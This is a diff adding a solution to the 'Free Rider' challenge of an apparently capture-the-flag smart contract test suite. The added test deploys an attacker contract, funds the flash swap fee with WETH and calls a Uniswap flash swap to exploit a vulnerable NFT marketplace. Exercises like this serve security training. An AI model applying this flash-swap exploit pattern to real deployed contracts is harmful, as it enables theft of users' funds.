@@ -105,6 +105,23 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const FreeRiderAttacker = await ethers.getContractFactory('FreeRiderAttacker', attacker);
+        var attack_contract = await FreeRiderAttacker.deploy(this.uniswapFactory.address, this.uniswapRouter.address, this.marketplace.address, this.buyerContract.address);
+
+        var amount = ethers.utils.parseEther('15');
+
+        // We compute flash swap fees and give needed WETH to the contract
+        var fees = amount.mul(3).div(997).add(1);
+        await this.weth.connect(attacker).deposit({ value: fees});
+        await this.weth.connect(attacker).transfer(attack_contract.address, fees);
+
+        // Flash swap and profit
+        await this.uniswapPair.connect(attacker).swap(
+            amount,                                                     // amount0Out
+            0,                                                          // amount1Out
+            attack_contract.address,                                    // to
+            ethers.utils.defaultAbiCoder.encode(["bytes1"], [0x69]),    // data
+        );
     });
 
     after(async function () {
